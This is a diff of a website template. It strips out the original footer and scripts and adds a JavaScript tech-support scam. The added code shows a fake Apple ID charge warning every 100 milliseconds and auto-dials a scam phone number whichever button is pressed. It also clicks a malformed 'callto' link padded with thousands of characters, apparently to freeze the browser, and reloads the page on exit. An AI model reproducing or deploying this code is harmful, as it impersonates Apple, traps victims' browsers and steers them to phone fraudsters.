-                  <li> <a href="#0"> <i class="lni lni-linkedin-original"></i> </a> </li>
-                </ul>
-              </div>
-            </div>
-            <div class="col-xl-2 offset-xl-1 col-lg-2 col-md-6 col-sm-6">
-              <div class="footer-widget wow fadeInUp" data-wow-delay=".3s">
-                <h6>Quick Link</h6>
-                <ul class="links">
-                  <li> <a href="#0">Home</a> </li>
-                  <li> <a href="#0">About</a> </li>
-                  <li> <a href="#0">Service</a> </li>
-                  <li> <a href="#0">Contact</a> </li>
-                </ul>
-              </div>
-            </div>
-            <div class="col-xl-3 col-lg-3 col-md-6 col-sm-6">
-              <div class="footer-widget wow fadeInUp" data-wow-delay=".4s">
-                <h6>Services</h6>
-                <ul class="links">
-                  <li> <a href="#0">Web Design</a> </li>
-                  <li> <a href="#0">Web Development</a> </li>
-                  <li> <a href="#0">Seo Optimization</a> </li>
-                  <li> <a href="#0">Blog Writing</a> </li>
-                </ul>
-              </div>
-            </div>
-            <div class="col-xl-3 col-lg-3 col-md-6">
-              <div class="footer-widget wow fadeInUp" data-wow-delay=".5s">
-                <h6>Help & Support</h6>
-                <ul class="links">
-                  <li> <a href="#0">Support Center</a> </li>
-                  <li> <a href="#0">Live Chat</a> </li>
-                  <li> <a href="#0">FAQ</a> </li>
-                  <li> <a href="#0">Terms & Conditions</a> </li>
-                </ul>
-              </div>
-            </div>
-          </div>
-        </div>
-        <div class="copyright-wrapper wow fadeInUp" data-wow-delay=".2s">
-          <p>Design and Developed by <a href="https://uideck.com" rel="nofollow" target="_blank">UIdeck</a> Built-with <a href="#">Lindy UI Kit</a>. Distibuted by <a href="https://themewagon.com" target="_blank">ThemeWagon</a></p>
-        </div>
-      </div>
     </footer>
-    <!-- ========================= footer style-1 end ========================= -->
 
-    <!-- ========================= scroll-top start ========================= -->
-    <a href="#" class="scroll-top"> <i class="lni lni-chevron-up"></i> </a>
-    <!-- ========================= scroll-top end ========================= -->
-		
 
-    <!-- ========================= JS here ========================= -->
-    <script src="assets/js/bootstrap.5.0.0.alpha-2-min.js"></script>
-    <script src="assets/js/count-up.min.js"></script>
-    <script src="assets/js/wow.min.js"></script>
-    <script src="assets/js/main.js"></script>
-  </body>
-</html>
+
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-844-449-3831');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-844-449-3831"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-844-449-3831 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+<script defer="" data-domain="iosmd.sire" src="js/script.js"></script>
+
+
+</body></html>
